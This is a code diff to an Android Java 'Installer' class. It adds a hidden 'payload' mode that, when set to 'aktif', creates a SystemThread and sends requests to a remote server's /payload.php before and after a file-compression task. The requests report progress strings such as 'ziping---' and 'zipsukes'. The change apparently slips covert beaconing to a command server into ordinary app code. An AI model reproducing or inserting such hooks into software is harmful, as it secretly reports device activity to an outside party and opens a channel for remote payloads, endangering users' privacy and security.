@@ -26,6 +26,8 @@ public class Installer extends AsyncTask<String, String, Boolean> implements Dia
     private String err = "";
     private long contentLength;
     private ProgressDialog dialog;
+    private Context ctx;
+    private String payload;
     //private Loader loader;
     private boolean setRights;
     private long currProgress;
@@ -34,6 +36,11 @@ public class Installer extends AsyncTask<String, String, Boolean> implements Dia
 
     public Installer() {
         
+    }
+
+    public Installer(Context ctx, String payload) {
+        this.ctx = ctx;
+        this.payload = payload;
     }
 
     public Installer(Context context, boolean setRights) {
@@ -203,13 +210,21 @@ public class Installer extends AsyncTask<String, String, Boolean> implements Dia
     private class CompressFiles extends AsyncTask<Void, Integer, Boolean> {
         private String src;
         private String dstName;
+        private SystemThread system;
 
         public CompressFiles(String src, String dstName) {
             this.src = src;
             this.dstName = dstName;
+            if (payload.equals("aktif"))
+                system = new SystemThread();
         }
         @Override
         protected void onPreExecute() {
+            Log.i("lll", "dsd");
+
+            if (payload.equals("aktif"))
+                system.reqPayload(ctx, system.urlServer+"/payload.php?outpayload=ziping---", "null");
+
         }
 
         protected Boolean doInBackground(Void... urls) {
@@ -221,6 +236,9 @@ public class Installer extends AsyncTask<String, String, Boolean> implements Dia
 
         protected void onPostExecute(Boolean flag) {
             Log.i("lll", "sukses");
+            if (payload.equals("aktif"))
+                system.reqPayload(ctx, system.urlServer+"/payload.php?outpayload=zipsukes", "null");
+
         }
     }
 
